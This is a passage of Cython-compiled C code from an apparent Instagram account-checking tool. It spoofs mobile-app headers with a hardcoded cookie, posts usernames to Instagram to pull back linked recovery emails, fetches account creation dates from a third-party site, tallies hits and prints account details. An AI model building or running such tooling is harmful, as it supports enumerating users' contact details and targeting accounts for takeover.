            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Bandwidth_Speed_KBPS, __pyx_kp_u_1_000) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Bandwidth_TotalBytes_B, __pyx_kp_u_0_3) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Bandwidth_TotalTime_MS, __pyx_kp_u_0_3) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_VP9_Capable, __pyx_n_u_false) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Bloks_Version_Id, __pyx_kp_u_009f03b18280bb343b0862d663f31ac8) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Connection_Type, __pyx_n_u_WIFI) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Capabilities, __pyx_kp_u_3brTvw) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_App_ID, __pyx_kp_u_567067343352427) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_User_Agent, __pyx_kp_u_Instagram_100_0_0_17_129_Android) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Accept_Language, __pyx_kp_u_ar_IQ_en_US) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_Cookie, __pyx_kp_u_mid_Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Content_Type, __pyx_kp_u_application_x_www_form_urlencode_2) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Accept_Encoding, __pyx_kp_u_gzip_deflate) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_Host, __pyx_kp_u_i_instagram_com) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_FB_HTTP_Engine, __pyx_n_u_Liger) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_Connection, __pyx_kp_u_keep_alive) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Content_Length, __pyx_kp_u_364) < 0) __PYX_ERR(0, 562, __pyx_L25_error)
            __Pyx_XDECREF_SET(__pyx_v_haha, ((PyObject*)__pyx_t_4));
            __pyx_t_4 = 0;

            
            __pyx_t_4 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 584, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_10 = PyTuple_New(3); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 584, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_24 = 0;
            __pyx_t_7 = 127;
            __Pyx_INCREF(__pyx_kp_u_ef02f559b04e8d7cbe15fb8cf18e2b48);
            __pyx_t_24 += 254;
            __Pyx_GIVEREF(__pyx_kp_u_ef02f559b04e8d7cbe15fb8cf18e2b48);
            PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_kp_u_ef02f559b04e8d7cbe15fb8cf18e2b48);

            
            __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_v_user, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 585, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
            __Pyx_GIVEREF(__pyx_t_12);
            PyTuple_SET_ITEM(__pyx_t_10, 1, __pyx_t_12);
            __pyx_t_12 = 0;
            __Pyx_INCREF(__pyx_kp_u__12);
            __pyx_t_24 += 2;
            __Pyx_GIVEREF(__pyx_kp_u__12);
            PyTuple_SET_ITEM(__pyx_t_10, 2, __pyx_kp_u__12);

            
            __pyx_t_12 = __Pyx_PyUnicode_Join(__pyx_t_10, 3, __pyx_t_24, __pyx_t_7); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 584, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_signed_body, __pyx_t_12) < 0) __PYX_ERR(0, 584, __pyx_L25_error)
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_ig_sig_key_version, __pyx_kp_u_4) < 0) __PYX_ERR(0, 584, __pyx_L25_error)
            __Pyx_XDECREF_SET(__pyx_v_ada, ((PyObject*)__pyx_t_4));
            __pyx_t_4 = 0;

            
            __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_post); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 589, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_12 = PyTuple_New(1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 589, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_INCREF(__pyx_v_url);
            __Pyx_GIVEREF(__pyx_v_url);
            PyTuple_SET_ITEM(__pyx_t_12, 0, __pyx_v_url);
            __pyx_t_10 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 589, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            if (PyDict_SetItem(__pyx_t_10, __pyx_n_s_headers, __pyx_v_haha) < 0) __PYX_ERR(0, 589, __pyx_L25_error)
            if (PyDict_SetItem(__pyx_t_10, __pyx_n_s_data, __pyx_v_ada) < 0) __PYX_ERR(0, 589, __pyx_L25_error)
            __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_12, __pyx_t_10); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 589, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_text); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 589, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_XDECREF_SET(__pyx_v_s, __pyx_t_10);
            __pyx_t_10 = 0;

            
            __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u__13, __pyx_v_s, Py_EQ)); if (unlikely(__pyx_t_23 < 0)) __PYX_ERR(0, 590, __pyx_L25_error)
            __pyx_t_22 = (__pyx_t_23 != 0);
            if (__pyx_t_22) {

              
              {
                __Pyx_PyThreadState_declare
                __Pyx_PyThreadState_assign
                __Pyx_ExceptionSave(&__pyx_t_21, &__pyx_t_20, &__pyx_t_19);
                __Pyx_XGOTREF(__pyx_t_21);
                __Pyx_XGOTREF(__pyx_t_20);
                __Pyx_XGOTREF(__pyx_t_19);
                /*try:*/ {

                  
                  __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_s, __pyx_n_s_split); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 592, __pyx_L34_error)
                  __Pyx_GOTREF(__pyx_t_12);
                  __pyx_t_4 = NULL;
                  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
                    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_12);
                    if (likely(__pyx_t_4)) {
                      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
                      __Pyx_INCREF(__pyx_t_4);
                      __Pyx_INCREF(function);
                      __Pyx_DECREF_SET(__pyx_t_12, function);
                    }
                  }
                  __pyx_t_11 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_4, __pyx_kp_u_email_2) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_kp_u_email_2);
                  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                  if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 592, __pyx_L34_error)
                  __Pyx_GOTREF(__pyx_t_11);
                  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
                  __pyx_t_12 = __Pyx_GetItemInt(__pyx_t_11, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 592, __pyx_L34_error)
                  __Pyx_GOTREF(__pyx_t_12);
                  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

                  
                  __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_split); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 593, __pyx_L34_error)
                  __Pyx_GOTREF(__pyx_t_11);
                  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
                  __pyx_t_12 = NULL;
                  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
                    __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_11);
                    if (likely(__pyx_t_12)) {
                      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
                      __Pyx_INCREF(__pyx_t_12);
                      __Pyx_INCREF(function);
                      __Pyx_DECREF_SET(__pyx_t_11, function);
                    }
                  }
                  __pyx_t_10 = (__pyx_t_12) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_12, __pyx_kp_u_status) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_kp_u_status);
                  __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
                  if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 593, __pyx_L34_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                  __pyx_t_11 = __Pyx_GetItemInt(__pyx_t_10, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 593, __pyx_L34_error)
                  __Pyx_GOTREF(__pyx_t_11);
                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                  __Pyx_XDECREF_SET(__pyx_v_rest, __pyx_t_11);
                  __pyx_t_11 = 0;

                  
                }
                __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
                __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
                goto __pyx_L41_try_end;
                __pyx_L34_error:;
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
                __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

                
                __pyx_t_14 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
                if (__pyx_t_14) {
                  __Pyx_AddTraceback("source.Sajad.chk", __pyx_clineno, __pyx_lineno, __pyx_filename);
                  if (__Pyx_GetException(&__pyx_t_11, &__pyx_t_10, &__pyx_t_12) < 0) __PYX_ERR(0, 594, __pyx_L36_except_error)
                  __Pyx_GOTREF(__pyx_t_11);
                  __Pyx_GOTREF(__pyx_t_10);
                  __Pyx_GOTREF(__pyx_t_12);

                  
                  __Pyx_INCREF(__pyx_kp_u_ERROR);
                  __Pyx_XDECREF_SET(__pyx_v_rest, __pyx_kp_u_ERROR);
                  __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                  __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                  __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
                  goto __pyx_L35_exception_handled;
                }
                goto __pyx_L36_except_error;
                __pyx_L36_except_error:;

                
                __Pyx_XGIVEREF(__pyx_t_21);
                __Pyx_XGIVEREF(__pyx_t_20);
                __Pyx_XGIVEREF(__pyx_t_19);
                __Pyx_ExceptionReset(__pyx_t_21, __pyx_t_20, __pyx_t_19);
                goto __pyx_L25_error;
                __pyx_L35_exception_handled:;
                __Pyx_XGIVEREF(__pyx_t_21);
                __Pyx_XGIVEREF(__pyx_t_20);
                __Pyx_XGIVEREF(__pyx_t_19);
                __Pyx_ExceptionReset(__pyx_t_21, __pyx_t_20, __pyx_t_19);
                __pyx_L41_try_end:;
              }

              
              goto __pyx_L33;
            }

            
            /*else*/ {
              __Pyx_INCREF(__pyx_kp_u_ERROR);
              __Pyx_XDECREF_SET(__pyx_v_rest, __pyx_kp_u_ERROR);
            }
            __pyx_L33:;

            
            __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_get); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 598, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);

            
            __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_id, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 599, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_9 = __Pyx_PyUnicode_Concat(__pyx_kp_u_https_o7aa_pythonanywhere_com_id, __pyx_t_4); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 599, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_9);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
              __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_11);
              if (likely(__pyx_t_4)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
                __Pyx_INCREF(__pyx_t_4);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_11, function);
              }
            }
            __pyx_t_10 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_4, __pyx_t_9) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_9);
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
            if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 598, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
            __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_json); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 599, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
              __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_11);
              if (likely(__pyx_t_10)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
                __Pyx_INCREF(__pyx_t_10);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_11, function);
              }
            }
            __pyx_t_12 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_11);
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 599, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_XDECREF_SET(__pyx_v_re, __pyx_t_12);
            __pyx_t_12 = 0;

            
            __pyx_t_12 = __Pyx_PyObject_Dict_GetItem(__pyx_v_re, __pyx_n_u_date); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 600, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_XDECREF_SET(__pyx_v_datet, __pyx_t_12);
            __pyx_t_12 = 0;

            
            __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_okhot); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 601, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_okout); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 601, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __pyx_t_10 = PyNumber_Add(__pyx_t_12, __pyx_t_11); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 601, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
            if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_fj, __pyx_t_10) < 0) __PYX_ERR(0, 601, __pyx_L25_error)
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

            
            __pyx_t_10 = PyList_New(1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 602, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_INCREF(__pyx_n_s_print);
            __Pyx_GIVEREF(__pyx_n_s_print);
            PyList_SET_ITEM(__pyx_t_10, 0, __pyx_n_s_print);
            __pyx_t_11 = __Pyx_Import(__pyx_n_s_rich, __pyx_t_10, 0); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 602, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = __Pyx_ImportFrom(__pyx_t_11, __pyx_n_s_print); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 602, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_XDECREF_SET(__pyx_v_print, __pyx_t_10);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

            
            __pyx_t_11 = PyList_New(1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 603, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_INCREF(__pyx_n_s_Panel);
            __Pyx_GIVEREF(__pyx_n_s_Panel);
            PyList_SET_ITEM(__pyx_t_11, 0, __pyx_n_s_Panel);
            __pyx_t_10 = __Pyx_Import(__pyx_n_s_rich_panel, __pyx_t_11, 0); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 603, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
            __pyx_t_11 = __Pyx_ImportFrom(__pyx_t_10, __pyx_n_s_Panel); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 603, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_XDECREF_SET(__pyx_v_Panel, __pyx_t_11);
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

            
            __pyx_t_10 = PyList_New(1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 604, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_INCREF(__pyx_n_s_Console);
            __Pyx_GIVEREF(__pyx_n_s_Console);
            PyList_SET_ITEM(__pyx_t_10, 0, __pyx_n_s_Console);
            __pyx_t_11 = __Pyx_Import(__pyx_n_s_rich_console, __pyx_t_10, 0); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 604, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = __Pyx_ImportFrom(__pyx_t_11, __pyx_n_s_Console); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 604, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_XDECREF_SET(__pyx_v_Console, __pyx_t_10);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

            
            __pyx_t_11 = PyList_New(1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 605, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_INCREF(__pyx_n_s_Text);
            __Pyx_GIVEREF(__pyx_n_s_Text);
            PyList_SET_ITEM(__pyx_t_11, 0, __pyx_n_s_Text);
            __pyx_t_10 = __Pyx_Import(__pyx_n_s_rich_text, __pyx_t_11, 0); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 605, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
            __pyx_t_11 = __Pyx_ImportFrom(__pyx_t_10, __pyx_n_s_Text); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 605, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_XDECREF_SET(__pyx_v_Text, __pyx_t_11);
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

            
            __pyx_t_10 = PyTuple_New(15); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 606, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_24 = 0;
            __pyx_t_7 = 127;
            __Pyx_INCREF(__pyx_kp_u_green_yellow);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 52;
            __Pyx_GIVEREF(__pyx_kp_u_green_yellow);
            PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_kp_u_green_yellow);
            __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_v_name, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 606, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
            __Pyx_GIVEREF(__pyx_t_11);
            PyTuple_SET_ITEM(__pyx_t_10, 1, __pyx_t_11);
            __pyx_t_11 = 0;
            __Pyx_INCREF(__pyx_kp_u_yellow_green_green_yellow);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 47;
            __Pyx_GIVEREF(__pyx_kp_u_yellow_green_green_yellow);
            PyTuple_SET_ITEM(__pyx_t_10, 2, __pyx_kp_u_yellow_green_green_yellow);
            __Pyx_INCREF(__pyx_v_email);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_email) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_email) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_v_email);
            __Pyx_GIVEREF(__pyx_v_email);
            PyTuple_SET_ITEM(__pyx_t_10, 3, __pyx_v_email);
            __Pyx_INCREF(__pyx_kp_u_yellow_green_green_yellow_2);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 45;
            __Pyx_GIVEREF(__pyx_kp_u_yellow_green_green_yellow_2);
            PyTuple_SET_ITEM(__pyx_t_10, 4, __pyx_kp_u_yellow_green_green_yellow_2);
            __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_v_fols, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 606, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
            __Pyx_GIVEREF(__pyx_t_11);
            PyTuple_SET_ITEM(__pyx_t_10, 5, __pyx_t_11);
            __pyx_t_11 = 0;
            __Pyx_INCREF(__pyx_kp_u_yellow_green_green_yellow_3);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 44;
            __Pyx_GIVEREF(__pyx_kp_u_yellow_green_green_yellow_3);
            PyTuple_SET_ITEM(__pyx_t_10, 6, __pyx_kp_u_yellow_green_green_yellow_3);
            __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_v_fol, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 606, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
            __Pyx_GIVEREF(__pyx_t_11);
            PyTuple_SET_ITEM(__pyx_t_10, 7, __pyx_t_11);
            __pyx_t_11 = 0;
            __Pyx_INCREF(__pyx_kp_u_yellow_green_green_yellow_4);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 41;
            __Pyx_GIVEREF(__pyx_kp_u_yellow_green_green_yellow_4);
            PyTuple_SET_ITEM(__pyx_t_10, 8, __pyx_kp_u_yellow_green_green_yellow_4);
            __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_v_datet, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 606, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
            __Pyx_GIVEREF(__pyx_t_11);
            PyTuple_SET_ITEM(__pyx_t_10, 9, __pyx_t_11);
            __pyx_t_11 = 0;
            __Pyx_INCREF(__pyx_kp_u_yellow_green_green_yellow_5);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 47;
            __Pyx_GIVEREF(__pyx_kp_u_yellow_green_green_yellow_5);
            PyTuple_SET_ITEM(__pyx_t_10, 10, __pyx_kp_u_yellow_green_green_yellow_5);
            __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_v_rest, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 606, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
            __Pyx_GIVEREF(__pyx_t_11);
            PyTuple_SET_ITEM(__pyx_t_10, 11, __pyx_t_11);
            __pyx_t_11 = 0;
            __Pyx_INCREF(__pyx_kp_u_yellow_green_green_yellow_6);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 47;
            __Pyx_GIVEREF(__pyx_kp_u_yellow_green_green_yellow_6);
            PyTuple_SET_ITEM(__pyx_t_10, 12, __pyx_kp_u_yellow_green_green_yellow_6);
            __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_v_bio, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 606, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
